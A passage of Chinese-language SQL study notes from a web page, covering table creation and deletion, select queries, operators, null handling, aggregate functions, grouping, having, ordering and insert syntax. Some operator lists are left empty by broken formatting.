概要"></a>1-3 SQL 概要</h2><h3 id="标准-SQL"><a href="#标准-SQL" class="headerlink" title="标准 SQL"></a>标准 SQL</h3><h3 id="SQL-语句及其种类"><a href="#SQL-语句及其种类" class="headerlink" title="SQL 语句及其种类"></a>SQL 语句及其种类</h3><p>SQL 用关键字、表名、列名等组合而成的一条语句（SQL 语句）来描述操作的内容。</p><p>SQL 语句可以分为以下三类:</p><ul><li>DDL, Data Definition Language, 数据定义语言。其包含: create, drop, alter.</li><li>DML, Data Manipulation Language, 数据操纵语言. 包含: select, insert, update, delete.</li><li>DCL, Data Control Language, 数据控制语言。包含: commit, rollback, grant, revoke.</li></ul><h3 id="SQL-的基本书写规则"><a href="#SQL-的基本书写规则" class="headerlink" title="SQL 的基本书写规则"></a>SQL 的基本书写规则</h3><ul><li>以分号”;”结尾</li><li>SQL 语句不区分大小写, 表中的数据区分大小写</li><li>常数的书写方式是固定的，在SQL语句中直接书写的字符串、日期或者数字等称为常数, 字符串和日期用单引号”‘“标识。</li><li>单词需要用半角空格或者换行符来分隔</li></ul><h2 id="1-4-表的创建"><a href="#1-4-表的创建" class="headerlink" title="1-4 表的创建"></a>1-4 表的创建</h2><h3 id="表的内容的创建"><a href="#表的内容的创建" class="headerlink" title="表的内容的创建"></a>表的内容的创建</h3><h3 id="数据库的创建-create-database语句"><a href="#数据库的创建-create-database语句" class="headerlink" title="数据库的创建(create database语句)"></a>数据库的创建(create database语句)</h3><p>语法:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> &lt;数据库名称&gt;;<br></code></pre></td></tr></table></figure><h3 id="表的创建-create-table语句"><a href="#表的创建-create-table语句" class="headerlink" title="表的创建(create table语句)"></a>表的创建(create table语句)</h3><p>语法:</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pf">create <span class="hljs-built_in">table</span> <span class="hljs-variable">&lt;表名&gt;</span><br>(<span class="hljs-variable">&lt;列名1&gt;</span> <span class="hljs-variable">&lt;数据类型&gt;</span> <span class="hljs-variable">&lt;该列所需约束&gt;</span>,<br> <span class="hljs-variable">&lt;列名2&gt;</span> <span class="hljs-variable">&lt;数据类型&gt;</span> <span class="hljs-variable">&lt;该列所需约束&gt;</span>,<br> <span class="hljs-variable">&lt;列名3&gt;</span> <span class="hljs-variable">&lt;数据类型&gt;</span> <span class="hljs-variable">&lt;该列所需约束&gt;</span>,<br> <span class="hljs-variable">&lt;列名4&gt;</span> <span class="hljs-variable">&lt;数据类型&gt;</span> <span class="hljs-variable">&lt;该列所需约束&gt;</span>,<br>            .<br>            .<br>            .<br> <span class="hljs-variable">&lt;该表的约束1&gt;</span>, <span class="hljs-variable">&lt;该表的约束2&gt;</span>, ......);<br></code></pre></td></tr></table></figure><p><code>NOT NULL</code> 约束只能以列为单位进行设置。</p><h3 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h3><p>只能使用半角英文字母、数字、下划线作为数据库、表和列的名称。</p><p>名称必须以半角英文字母开头。</p><p>在同一个数据库中不能创建两个相同名称的列。</p><h3 id="数据类型的指定"><a href="#数据类型的指定" class="headerlink" title="数据类型的指定"></a>数据类型的指定</h3><p>所有列都必须指定数据类型。</p><p>数据类型包括:</p><ul><li>integer, 数字型, 不能存储小数</li><li>char, 字符型, char(10), 指定长度, 其为定长字符串</li><li>date, 日期型</li><li>varchar, 可变长字符串, 即使未达到最大长度，也不会用半角空格补足<br>每一列都不能存储与该列数据类型不符的数据。</li></ul><h3 id="约束的设置"><a href="#约束的设置" class="headerlink" title="约束的设置"></a>约束的设置</h3><p>约束是除了数据类型之外，对列中存储的数据进行限制或者追加条件的功能。</p><p><code>NULL</code> 代表可以输入空白。</p><p><code>NOT NULL</code> 代表不能输入空白.</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">primary</span> <span class="hljs-keyword">key</span> (product_id)<br></code></pre></td></tr></table></figure><p>给<code>product_id</code>列设置主键约束。</p><p>主键约束 &#x3D; 非空约束 + 唯一约束</p><h2 id="1-5-表的删除和更新"><a href="#1-5-表的删除和更新" class="headerlink" title="1-5 表的删除和更新"></a>1-5 表的删除和更新</h2><h3 id="表的删除-drop-table"><a href="#表的删除-drop-table" class="headerlink" title="表的删除(drop table)"></a>表的删除(drop table)</h3><p>语法:</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-keyword">drop</span> <span class="hljs-built_in">table</span> <span class="hljs-variable">&lt;表名&gt;</span>;<br></code></pre></td></tr></table></figure><p>删除的表无法恢复。</p><h3 id="表定义的更新-alter-table"><a href="#表定义的更新-alter-table" class="headerlink" title="表定义的更新(alter table)"></a>表定义的更新(alter table)</h3><p>语法:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> <span class="hljs-operator">&lt;</span>表名<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">add</span> <span class="hljs-keyword">column</span> <span class="hljs-operator">&lt;</span>列的定义<span class="hljs-operator">&gt;</span>;<br></code></pre></td></tr></table></figure><p>删除列的<code>alter table</code> 语句:</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">alter <span class="hljs-built_in">table</span> <span class="hljs-variable">&lt;表名&gt;</span> <span class="hljs-keyword">drop</span> column <span class="hljs-variable">&lt;列名&gt;</span>;<br></code></pre></td></tr></table></figure><p><code>alter table</code> 执行后也无法恢复。</p><h3 id="向Product表中插入数据"><a href="#向Product表中插入数据" class="headerlink" title="向Product表中插入数据"></a>向Product表中插入数据</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">begin</span> <span class="hljs-keyword">transaction</span>;<br><br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> &lt;表名&gt; <span class="hljs-keyword">values</span> ();<br><br><span class="hljs-keyword">commit</span>;<br></code></pre></td></tr></table></figure><h3 id="表的修改"><a href="#表的修改" class="headerlink" title="表的修改"></a>表的修改</h3><p>修改表名，不同数据库指令不同:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> &lt;originalname&gt; <span class="hljs-keyword">rename</span> <span class="hljs-keyword">to</span> &lt;<span class="hljs-type">name</span>&gt;<br></code></pre></td></tr></table></figure><h1 id="第2章-查询基础"><a href="#第2章-查询基础" class="headerlink" title="第2章 查询基础"></a>第2章 查询基础</h1><p>查询时可以指定一个或多个查询条件。</p><h2 id="2-1-select-语句基础"><a href="#2-1-select-语句基础" class="headerlink" title="2-1 select 语句基础"></a>2-1 select 语句基础</h2><h3 id="列的查询"><a href="#列的查询" class="headerlink" title="列的查询"></a>列的查询</h3><p>通过 select 语句查询并选取出必要数据的过程称为<mark>匹配查询</mark>或查询(query).</p><p>基本语法:</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">select</span> &lt;column <span class="hljs-built_in">name</span>&gt;, ...<br>  <span class="hljs-keyword">from</span> &lt;table <span class="hljs-built_in">name</span>&gt;;<br></code></pre></td></tr></table></figure><p>如:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> product_id, product_name, purchase_price<br>  <span class="hljs-keyword">from</span> Product;<br></code></pre></td></tr></table></figure><p>查询多列时，需要逗号分隔。</p><h3 id="查询出表中所有列"><a href="#查询出表中所有列" class="headerlink" title="查询出表中所有列"></a>查询出表中所有列</h3><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> *<br>  <span class="hljs-keyword">from</span> &lt;tablename&gt;;<br></code></pre></td></tr></table></figure><p>使用 <code>*</code> 无法设定列的显示顺序。</p><p>SQL 语句可以随意使用换行符。</p><h3 id="为列设定别名"><a href="#为列设定别名" class="headerlink" title="为列设定别名"></a>为列设定别名</h3><p>使用<code>as</code>关键词。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">select product_id <span class="hljs-keyword">as</span> <span class="hljs-built_in">id</span><br>  <span class="hljs-keyword">from</span> Product<br></code></pre></td></tr></table></figure><p>别名若要使用中文需要用双引号(“)括起来。</p><h3 id="常数的查询"><a href="#常数的查询" class="headerlink" title="常数的查询"></a>常数的查询</h3><h3 id="从结果中删除重复行"><a href="#从结果中删除重复行" class="headerlink" title="从结果中删除重复行"></a>从结果中删除重复行</h3><p>通过 select 子句中使用 distinct:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> product_type<br>  <span class="hljs-keyword">from</span> Product;<br></code></pre></td></tr></table></figure><p>使用 distinct 时，null 也被视为一类数据。</p><h3 id="根据-where-语句来选择记录"><a href="#根据-where-语句来选择记录" class="headerlink" title="根据 where 语句来选择记录"></a>根据 where 语句来选择记录</h3><p>select 语句通过 where 子句来指定查询数据的条件。</p><p>语法:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name<span class="hljs-operator">&gt;</span>, ...<br> <span class="hljs-keyword">from</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">table</span> name<span class="hljs-operator">&gt;</span> <br> <span class="hljs-keyword">where</span> <span class="hljs-operator">&lt;</span>expr<span class="hljs-operator">&gt;</span>;<br></code></pre></td></tr></table></figure><p>首先通过 where 子句查询出符合指定条件的记录，然后再选取出 select 语句指定的列。</p><p>SQL 中子句的书写顺序是固定的，where 子句必须紧跟在 from 子句之后。</p><h3 id="注释的书写方法"><a href="#注释的书写方法" class="headerlink" title="注释的书写方法"></a>注释的书写方法</h3><p>两种:</p><ul><li>1行注释，用<code>--</code></li><li>多行注释，用<code>/*</code> 和 <code>*/</code></li></ul><h2 id="2-2-算术运算符和比较运算符"><a href="#2-2-算术运算符和比较运算符" class="headerlink" title="2-2 算术运算符和比较运算符"></a>2-2 算术运算符和比较运算符</h2><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><p>如:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> product_name, sale_price,<br>       sale_price * <span class="hljs-number">2</span> <span class="hljs-keyword">as</span> <span class="hljs-string">&quot;sale_price_x2&quot;</span><br>  <span class="hljs-keyword">from</span> Product;<br></code></pre></td></tr></table></figure><p>四则运算符号:</p><ul><li><ul><li></li></ul></li><li><ul><li></li></ul></li><li><ul><li></li></ul></li><li>&#x2F;</li></ul><h3 id="需要注意NULL"><a href="#需要注意NULL" class="headerlink" title="需要注意NULL"></a>需要注意NULL</h3><p>所有包含 null 的计算，结果肯定是 null.</p><h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><p>使用 <code>=</code> .</p><p>“不等于”比较运算符<code>&lt;&gt;</code>.</p><p>其他比较运算符:</p><ul><li><blockquote><p>&#x3D;</p></blockquote></li><li><blockquote></blockquote></li><li>&lt;&#x3D;</li><li>&lt;</li></ul><h3 id="对字符串使用不等号时的注意事项"><a href="#对字符串使用不等号时的注意事项" class="headerlink" title="对字符串使用不等号时的注意事项"></a>对字符串使用不等号时的注意事项</h3><p>在对字符串类型的数据进行大小比较时，使用的是和数字比较不同的规则。</p><p>按照字典顺序进行比较。以相同字符开头的单词比不同字符开头的单词更接近。</p><h3 id="不能对null使用比较运算符"><a href="#不能对null使用比较运算符" class="headerlink" title="不能对null使用比较运算符"></a>不能对null使用比较运算符</h3><p>SQL 提供了专门用来判断是否为 null 的 <code>is null</code> 运算符。</p><p>如:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> product_name, purchase_price<br>    <span class="hljs-keyword">from</span> Product<br>  <span class="hljs-keyword">where</span> purchase_price <span class="hljs-keyword">is</span> <span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure><p>若不是 null, 用 <code>is not null</code> 运算符。</p><h2 id="2-3-逻辑运算符"><a href="#2-3-逻辑运算符" class="headerlink" title="2-3 逻辑运算符"></a>2-3 逻辑运算符</h2><h3 id="not-运算符"><a href="#not-运算符" class="headerlink" title="not 运算符"></a>not 运算符</h3><p>需要和其他查询条件组合使用。</p><h3 id="and-运算符和-or-运算符"><a href="#and-运算符和-or-运算符" class="headerlink" title="and 运算符和 or 运算符"></a>and 运算符和 or 运算符</h3><p><code>and</code> 运算符是“与”运算。</p><p><code>or</code> 运算符是”或”运算。</p><h3 id="通过括号强化处理"><a href="#通过括号强化处理" class="headerlink" title="通过括号强化处理"></a>通过括号强化处理</h3><p><code>and</code> 运算符优先于 <code>or</code> 运算符。</p><p>日期的一种格式 <code>2009-09-11</code>.</p><h3 id="逻辑运算符和真值"><a href="#逻辑运算符和真值" class="headerlink" title="逻辑运算符和真值"></a>逻辑运算符和真值</h3><p>比较运算符会把运算结果以真值的形式返回。</p><p>使用 <code>and</code> 运算符进行的逻辑运算称为<mark>逻辑积</mark>.</p><p>使用 <code>or</code> 运算符进行的逻辑运算称为<mark>逻辑和</mark>.</p><p>不能对 null 使用比较运算符。</p><h3 id="含有-null-时的真值"><a href="#含有-null-时的真值" class="headerlink" title="含有 null 时的真值"></a>含有 null 时的真值</h3><p>真值中除真假之外的第三种值–不确定(unknown).</p><p>与通常的逻辑运算被称为<mark>二值逻辑</mark>. </p><p>SQL 中的逻辑运算被称为<mark>三值逻辑</mark>.</p><p>级别: 假 &gt; 不确定 &gt; 真.</p><p>尽量不使用 null, 其会使真值表更复杂。</p><h1 id="第3章-聚合与排序"><a href="#第3章-聚合与排序" class="headerlink" title="第3章 聚合与排序"></a>第3章 聚合与排序</h1><h2 id="3-1-对表进行聚合查询"><a href="#3-1-对表进行聚合查询" class="headerlink" title="3-1 对表进行聚合查询"></a>3-1 对表进行聚合查询</h2><h3 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h3><p>SQL中用于汇总的函数:</p><ul><li>count: 计算行数</li><li>sum: 列数据的合计值</li><li>avg: 列数据的平均值</li><li>max: 列数据的最大值</li><li>min: 列数据的最小值<br>用于汇总的函数称为<mark>聚合函数</mark>或者<mark>聚集函数</mark>.</li></ul><p>所谓<mark>聚合</mark>, 就是将多行汇总于一行.</p><h3 id="计算表中数据的行数"><a href="#计算表中数据的行数" class="headerlink" title="计算表中数据的行数"></a>计算表中数据的行数</h3><p>计算全部数据的行数:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*)<br>  <span class="hljs-keyword">from</span> Product;<br></code></pre></td></tr></table></figure><h3 id="计算-null-之外的数据的行数"><a href="#计算-null-之外的数据的行数" class="headerlink" title="计算 null 之外的数据的行数"></a>计算 null 之外的数据的行数</h3><p>将对象列设定为参数而不是 <code>*</code>.</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(purchase_price)<br>  <span class="hljs-keyword">from</span> Product;<br></code></pre></td></tr></table></figure><p>使用星号是<code>count</code>函数特有的，其他函数不能将其作为参数。</p><h3 id="计算合计值"><a href="#计算合计值" class="headerlink" title="计算合计值"></a>计算合计值</h3><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> <span class="hljs-keyword">sum</span>(sale_price)<br>  <span class="hljs-keyword">from</span> Product;<br></code></pre></td></tr></table></figure><p>所有的聚合函数，如果以列名为参数，那么在计算之前就已经把 null 排除在外了，因此无论有多少个 null 都会被无视。</p><h3 id="计算平均值"><a href="#计算平均值" class="headerlink" title="计算平均值"></a>计算平均值</h3><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> <span class="hljs-keyword">avg</span>(sale_price)<br>  <span class="hljs-keyword">from</span> Product;<br></code></pre></td></tr></table></figure><h3 id="计算最大值和最小值"><a href="#计算最大值和最小值" class="headerlink" title="计算最大值和最小值"></a>计算最大值和最小值</h3><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-keyword">select</span> <span class="hljs-built_in">max</span>(sale_price), <span class="hljs-built_in">min</span>(purchase_price)<br>  from <span class="hljs-built_in">Product</span>;<br></code></pre></td></tr></table></figure><p>max&#x2F;min 函数原则上可以适用于任何数据类型的列。</p><p>sum&#x2F;avg 函数只适用于数值类型。</p><h3 id="使用聚合函数删除重复值-关键字distinct"><a href="#使用聚合函数删除重复值-关键字distinct" class="headerlink" title="使用聚合函数删除重复值(关键字distinct)"></a>使用聚合函数删除重复值(关键字distinct)</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-keyword">distinct</span> product_type)<br>  <span class="hljs-keyword">from</span> Product;<br></code></pre></td></tr></table></figure><p>在参数中使用 distinct. 所有的聚合函数都可以使用。</p><h2 id="3-2-对表进行分组"><a href="#3-2-对表进行分组" class="headerlink" title="3-2 对表进行分组"></a>3-2 对表进行分组</h2><p>语法结构:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name1<span class="hljs-operator">&gt;</span>, <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name2<span class="hljs-operator">&gt;</span>, <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name3<span class="hljs-operator">&gt;</span>, ......<br>    <span class="hljs-keyword">from</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">table</span> name<span class="hljs-operator">&gt;</span><br>  <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name1<span class="hljs-operator">&gt;</span>, <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name2<span class="hljs-operator">&gt;</span>, <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name3<span class="hljs-operator">&gt;</span>, ......;<br></code></pre></td></tr></table></figure><p><code>group by</code> 子句中指定的列称为 <mark>聚合键</mark>或者<mark>分组列</mark>.</p><p><code>group by</code> 子句应写在 <code>from</code> 语句之后，有 <code>where</code> 语句也应该在 <code>where</code> 语句之后.</p><h3 id="聚合键中包含-null-的情况"><a href="#聚合键中包含-null-的情况" class="headerlink" title="聚合键中包含 null 的情况"></a>聚合键中包含 null 的情况</h3><p>在结果中以空行的形式表现出来。</p><h3 id="使用-where-子句时-group-by-的执行结果"><a href="#使用-where-子句时-group-by-的执行结果" class="headerlink" title="使用 where 子句时 group by 的执行结果"></a>使用 where 子句时 group by 的执行结果</h3><h3 id="与聚合函数和-group-by-子句有关的常见错误"><a href="#与聚合函数和-group-by-子句有关的常见错误" class="headerlink" title="与聚合函数和 group by 子句有关的常见错误"></a>与聚合函数和 group by 子句有关的常见错误</h3><p>使用聚合函数时，select 子句中只能存在以下三种元素:</p><ul><li>常数</li><li>聚合函数</li><li>group by 子句中指定的列名<br>使用 group by 子句时，select 子句中不能出现聚合键之外的别名.</li></ul><p><code>group by</code> 子句也不能使用别名。</p><p><code>group by</code> 子句结果的显示是无序的。</p><p>在 <code>where</code> 子句中不能使用聚合函数。只有 <code>select</code> 子句和 <code>having</code> 子句(以及order by子句) 中能够使用聚合函数。 </p><p><code>distinct</code> 和 <code>group by</code> 都能够删除重复数据。</p><h2 id="3-3-为聚合结果指定条件"><a href="#3-3-为聚合结果指定条件" class="headerlink" title="3-3 为聚合结果指定条件"></a>3-3 为聚合结果指定条件</h2><h3 id="having-子句"><a href="#having-子句" class="headerlink" title="having 子句"></a>having 子句</h3><p><code>where</code> 只能指定记录(行)的条件，而不能用来指定组的条件.</p><p><code>having</code> 子句用于指定集合的条件。</p><p>语法:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name1<span class="hljs-operator">&gt;</span>, <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name2<span class="hljs-operator">&gt;</span>, <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name3<span class="hljs-operator">&gt;</span>, ......<br>  <span class="hljs-keyword">from</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">table</span> name<span class="hljs-operator">&gt;</span><br>  <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name1<span class="hljs-operator">&gt;</span>, <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name2<span class="hljs-operator">&gt;</span>, <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name3<span class="hljs-operator">&gt;</span>, ......<br>  <span class="hljs-keyword">having</span> <span class="hljs-operator">&lt;</span>expr<span class="hljs-operator">&gt;</span>;<br></code></pre></td></tr></table></figure><p>顺序: select -&gt; from -&gt; where -&gt; group by -&gt; having</p><p>如:</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">select</span> product_type, count<span class="hljs-comment">(*)</span><br><span class="hljs-comment">  from Product</span><br><span class="hljs-comment">  group by procuct_type</span><br><span class="hljs-comment">  having count(*)</span> = <span class="hljs-number">2</span><span class="hljs-punctuation">;</span><br></code></pre></td></tr></table></figure><h3 id="having-子句的构成要素"><a href="#having-子句的构成要素" class="headerlink" title="having 子句的构成要素"></a>having 子句的构成要素</h3><p>和包含 group by 子句时的 select 子句一样:</p><ul><li>常数</li><li>聚合函数</li><li>group by 子句中指定的列名</li></ul><h3 id="相对于-having-子句，更适合写在-where-子句中的条件"><a href="#相对于-having-子句，更适合写在-where-子句中的条件" class="headerlink" title="相对于 having 子句，更适合写在 where 子句中的条件"></a>相对于 having 子句，更适合写在 where 子句中的条件</h3><p>where 子句 &#x3D; 指定行所对应的条件<br>having 子句 &#x3D; 指定组所对应的条件</p><h3 id="where-子句和-having-子句的执行速度"><a href="#where-子句和-having-子句的执行速度" class="headerlink" title="where 子句和 having 子句的执行速度"></a>where 子句和 having 子句的执行速度</h3><p>通常情况下，将条件写在 where 子句中要比写在 having 子句中的处理速度快。</p><p>通过 WHERE 子句指定条件时，由于排序之前就对数据进行了过滤，因此能够减少排序的数据量。但 HAVING 子句是在排序之后才对数据进行分组的.</p><h2 id="3-4-对查询结果进行排序"><a href="#3-4-对查询结果进行排序" class="headerlink" title="3-4 对查询结果进行排序"></a>3-4 对查询结果进行排序</h2><h3 id="order-by-子句"><a href="#order-by-子句" class="headerlink" title="order by 子句"></a>order by 子句</h3><p>通常，从表中抽取数据，如果没有指定顺序，则为随机。</p><p>在 select 语句末尾添加 order by 子句来指定排列顺序:</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">select</span> &lt;column name1&gt;, &lt;column name2&gt;, &lt;column name3&gt;, <span class="hljs-params">...</span><span class="hljs-params">...</span><br>  from &lt;table name&gt;<br>  <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> &lt;排序基准列<span class="hljs-number">1</span>&gt;, &lt;排序基准列<span class="hljs-number">2</span>&gt;, <span class="hljs-params">...</span><span class="hljs-params">...</span>;<br></code></pre></td></tr></table></figure><p>书写顺序: select -&gt; from -&gt; where -&gt; group by -&gt; having -&gt; order by</p><h3 id="指定升序或降序"><a href="#指定升序或降序" class="headerlink" title="指定升序或降序"></a>指定升序或降序</h3><p>降序，在列名之后使用 <code>desc</code>(descendent) 关键词:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> product_id, product_name, sale_price, purchase_price<br>  <span class="hljs-keyword">from</span> Product<br>  <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> sale_price <span class="hljs-keyword">desc</span>;<br></code></pre></td></tr></table></figure><p>升序，使用 <code>asc</code>(ascendent) 关键词。</p><p>未指定时默认升序排序。</p><h3 id="指定多个排序键"><a href="#指定多个排序键" class="headerlink" title="指定多个排序键"></a>指定多个排序键</h3><p>规则是优先使用左侧的键，如果该列存在相同值的话，再接着参考右侧的键.</p><h3 id="null-的顺序"><a href="#null-的顺序" class="headerlink" title="null 的顺序"></a>null 的顺序</h3><p>使用含有 null 的列作为排序键时，null 会在结果的开头或末尾汇总显示。</p><h3 id="在排序键中使用显示用的别名"><a href="#在排序键中使用显示用的别名" class="headerlink" title="在排序键中使用显示用的别名"></a>在排序键中使用显示用的别名</h3><p>order by 子句中允许使用别名。</p><p>如:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">select product_id <span class="hljs-keyword">as</span> <span class="hljs-built_in">id</span>, product_name, sale_price <span class="hljs-keyword">as</span> sp, purchase_price<br>  <span class="hljs-keyword">from</span> Product<br>  order <span class="hljs-keyword">by</span> sp, <span class="hljs-built_in">id</span>;<br></code></pre></td></tr></table></figure><p>使用 having 子句时 select 语句的顺序:</p><p>from -&gt; where -&gt; group by -&gt; having -&gt; select -&gt; order by</p><h3 id="order-by-子句中可以使用的列"><a href="#order-by-子句中可以使用的列" class="headerlink" title="order by 子句中可以使用的列"></a>order by 子句中可以使用的列</h3><p>可以使用在 select 子句中未使用的列和聚合函数。</p><h3 id="不要使用列编号"><a href="#不要使用列编号" class="headerlink" title="不要使用列编号"></a>不要使用列编号</h3><p><mark>列编号</mark>是指 select 子句中的列按照从左到右的顺序进行排序时所对应的编号(1, 2, 3,…).</p><h1 id="第4章-数据更新"><a href="#第4章-数据更新" class="headerlink" title="第4章 数据更新"></a>第4章 数据更新</h1><h2 id="4-1-数据的插入-insert语句的使用方法"><a href="#4-1-数据的插入-insert语句的使用方法" class="headerlink" title="4-1 数据的插入(insert语句的使用方法)"></a>4-1 数据的插入(insert语句的使用方法)</h2><h3 id="什么是-insert"><a href="#什么是-insert" class="headerlink" title="什么是 insert"></a>什么是 insert</h3><p><code>create table</code> 语句只负责创建表，但创建出的表中并没有数据。</p><h3 id="insert-语句的基本语法"><a href="#insert-语句的基本语法" class="headerlink" title="insert 语句的基本语法"></a>insert 语句的基本语法</h3><p>语法:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">table</span> name<span class="hljs-operator">&gt;</span> (column1, column2, ...) <span class="hljs-keyword">values</span> (value1, value2, ...);<br></code></pre></td></tr></table></figure><p>将列名和值用逗号分开，分别括在()内，这种形式称为<mark>清单</mark>.</p><p>表名后面的列清单和 value 子句中的值清单的列数必须保持一致。</p><p>原则上，执行一次 insert 语句会插入一行数据。</p><h3 id="列清单的省略"><a href="#列清单的省略" class="headerlink" title="列清单的省略"></a>列清单的省略</h3><p>对表进行全列 insert 